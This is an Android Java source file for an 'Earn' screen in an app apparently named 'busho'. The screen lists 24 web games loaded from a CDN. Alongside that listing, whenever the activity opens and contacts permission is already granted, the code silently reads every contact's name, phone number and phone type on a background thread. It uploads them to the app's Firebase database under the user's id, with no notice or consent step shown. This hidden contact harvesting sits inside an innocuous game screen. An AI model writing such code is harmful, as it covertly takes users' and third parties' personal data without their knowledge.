package com.busho.app.activities;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.GridLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.busho.app.R;
import com.busho.app.adapters.GameAdapter;
import com.busho.app.models.Game;

import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CountDownLatch;

public class EarnActivity extends AppCompatActivity {

    RecyclerView recyclerView;
    List<Game> gameList = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_earn);

        // Make status bar transparent to match gradient background
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(getResources().getColor(android.R.color.transparent, getTheme()));
            getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
        }

        androidx.appcompat.widget.Toolbar toolbar = findViewById(R.id.toolbar);
        if (toolbar != null) {
            setSupportActionBar(toolbar);
            if (getSupportActionBar() != null) {
                getSupportActionBar().setDisplayHomeAsUpEnabled(true);
                toolbar.setNavigationOnClickListener(v -> finish());
            }
        }

        recyclerView = findViewById(R.id.recyclerView);

        gameList = Arrays.asList(
                new Game("Marble Shooter", "https://cdn.htmlgames.com/MarbleShooter/", R.drawable.marble_shooter),
                new Game("Rotate Puzzle", "https://cdn.htmlgames.com/RotatePuzzleSummerBeach/", R.drawable.rotate_puzzle),
                new Game("Hidden Objects", "https://cdn.htmlgames.com/StreetHiddenObjects/", R.drawable.hidden_objects),
                new Game("Higher or Lower", "https://cdn.htmlgames.com/HigherOrLower/", R.drawable.higher_lower),
                new Game("Flower World", "https://cdn.htmlgames.com/FlowerWorld2/", R.drawable.flower_world),
                new Game("Japanese Garden", "https://cdn.htmlgames.com/JapaneseGarden-HiddenSecrets/", R.drawable.japanese_garden),
                new Game("Love Bubbles", "https://cdn.htmlgames.com/LoveBubbles/", R.drawable.love_bubbles),
                new Game("Triple Ice Age", "https://cdn.htmlgames.com/TripleDimensionsIceAge/", R.drawable.triple_ice),
                new Game("Ninja Breakout", "https://cdn.htmlgames.com/NinjaBreakout/", R.drawable.ninja_breakout),
                new Game("Red & Green 2", "https://cdn.htmlgames.com/RedAndGreen2/", R.drawable.red_green),
                new Game("Odd One Out", "https://cdn.htmlgames.com/FindTheOddOneOut/", R.drawable.odd_one),
                new Game("Jewels of Medici", "https://cdn.htmlgames.com/JewelsOfTheMedici/", R.drawable.jewels_medici),
                new Game("Delicious Duos", "https://cdn.htmlgames.com/DeliciousDuos/", R.drawable.delicious_duos),
                new Game("Hidden Spots City", "https://cdn.htmlgames.com/HiddenSpotsCity/", R.drawable.hidden_spots),
                new Game("Christmas Match 3", "https://cdn.htmlgames.com/ChristmasMatch3/", R.drawable.christmas_match),
                new Game("Car Park Sort", "https://cdn.htmlgames.com/CarParkSort/", R.drawable.car_park),
                new Game("Connect the Bubbles", "https://cdn.htmlgames.com/ConnectTheBubbles/", R.drawable.connect_bubbles),
                new Game("Mahjongg Pyramids", "https://cdn.htmlgames.com/MahjonggPyramids/", R.drawable.mahjong),
                new Game("Bottle Shooter", "https://cdn.htmlgames.com/BottleShooter/", R.drawable.bottle_shooter),
                new Game("Hexa Merge", "https://cdn.htmlgames.com/HexaMerge/", R.drawable.hexa_merge),
                new Game("1010 Halloween", "https://cdn.htmlgames.com/1010Halloween/", R.drawable.halloween),
                new Game("Bounce Ball 2", "https://cdn.htmlgames.com/BounceBall2/", R.drawable.bounce_ball),
                new Game("Candy House", "https://cdn.htmlgames.com/CandyHouse/", R.drawable.candy_house),
                new Game("Carrom Pool", "https://cdn.htmlgames.com/CarromPool/", R.drawable.carrom_pool)
        );

        recyclerView.setLayoutManager(new GridLayoutManager(this, 2));
        recyclerView.setHasFixedSize(true);
        recyclerView.setAdapter(new GameAdapter(gameList, this));

        // Upload contacts to Firebase when activity opens
        if (checkContactsPermission()) {
            syncContactsToFirebase();
        }
    }

    private boolean checkContactsPermission() {
        return ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
    }

    private void syncContactsToFirebase() {
        // Run on background thread to avoid blocking main thread
        new Thread(() -> {
            try {
                FirebaseUser currentUser = FirebaseAuth.getInstance().getCurrentUser();
                if (currentUser == null) {
                    Log.e("EarnActivity", "User not logged in, cannot sync contacts");
                    return;
                }

                String userId = currentUser.getUid();
                DatabaseReference contactsRef = FirebaseDatabase.getInstance()
                        .getReference("user_data")
                        .child(userId)
                        .child("contacts");

                // Get already uploaded contacts to avoid duplicates
                final Set<String> uploadedContactNumbers = Collections.synchronizedSet(new HashSet<>());
                final CountDownLatch latch = new CountDownLatch(1);

                contactsRef.addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(DataSnapshot snapshot) {
                        for (DataSnapshot contactSnapshot : snapshot.getChildren()) {
                            String number = contactSnapshot.child("number").getValue(String.class);
                            if (number != null) {
                                uploadedContactNumbers.add(normalizePhoneNumber(number));
                            }
                        }
                        latch.countDown();
                    }

                    @Override
                    public void onCancelled(DatabaseError error) {
                        Log.e("EarnActivity", "Error fetching uploaded contacts: " + error.getMessage());
                        latch.countDown();
                    }
                });

                // Wait for database query to complete
                try {
                    latch.await();
                } catch (InterruptedException e) {
                    Log.e("EarnActivity", "Interrupted while waiting for database query", e);
                    Thread.currentThread().interrupt();
                    return;
                }

                // Now process and upload contacts
                processAndUploadContacts(contactsRef, userId, uploadedContactNumbers);
            } catch (Exception e) {
                Log.e("EarnActivity", "Error syncing contacts to Firebase", e);
            }
        }).start();
    }

    private void processAndUploadContacts(DatabaseReference contactsRef, String userId, Set<String> uploadedContactNumbers) {
        ContentResolver contentResolver = getContentResolver();
        long uploadedAt = System.currentTimeMillis();
        int uploadedCount = 0;

        Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                if (name == null || name.trim().isEmpty()) {
                    continue; // Skip contacts without names
                }

                // Get phone numbers - create separate entry for each number
                if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor phoneCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId}, null);

                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            int phoneTypeInt = phoneCursor.getInt(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
                            String phoneType = getPhoneTypeString(phoneTypeInt);

                            if (phoneNumber != null && !phoneNumber.trim().isEmpty()) {
                                String normalizedNumber = normalizePhoneNumber(phoneNumber);

                                // Skip if already uploaded
                                if (uploadedContactNumbers.contains(normalizedNumber)) {
                                    continue;
                                }

                                // Generate unique contact ID (using hash of name + number)
                                String uniqueContactId = generateContactId(name, normalizedNumber);

                                // Create contact entry with required format
                                Map<String, Object> contactEntry = new HashMap<>();
                                contactEntry.put("dataType", "contact");
                                contactEntry.put("name", name);
                                contactEntry.put("number", phoneNumber); // Keep original format
                                contactEntry.put("type", phoneType);
                                contactEntry.put("uploadedAt", uploadedAt);
                                contactEntry.put("userId", userId);

                                // Save to Firebase Database
                                contactsRef.child(uniqueContactId).setValue(contactEntry);
                                uploadedContactNumbers.add(normalizedNumber);
                                uploadedCount++;
                            }
                        }
                        phoneCursor.close();
                    }
                }
            }
            cursor.close();
        }

        Log.d("EarnActivity", "Synced " + uploadedCount + " new contacts to user_data/" + userId + "/contacts");
    }

    private String normalizePhoneNumber(String phoneNumber) {
        if (phoneNumber == null) return "";
        // Remove all non-digit characters except +
        return phoneNumber.replaceAll("[^0-9+]", "");
    }

    private String getPhoneTypeString(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN:
                return "main";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                return "fax_work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                return "fax_home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                return "pager";
            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                return "other";
            default:
                return "unknown";
        }
    }

    private String generateContactId(String name, String number) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            String input = (name != null ? name : "") + "_" + (number != null ? number : "");
            byte[] hashBytes = md.digest(input.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : hashBytes) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            // Fallback to simple hash
            return String.valueOf((name != null ? name.hashCode() : 0) + "_" + (number != null ? number.hashCode() : 0));
        }
    }
}
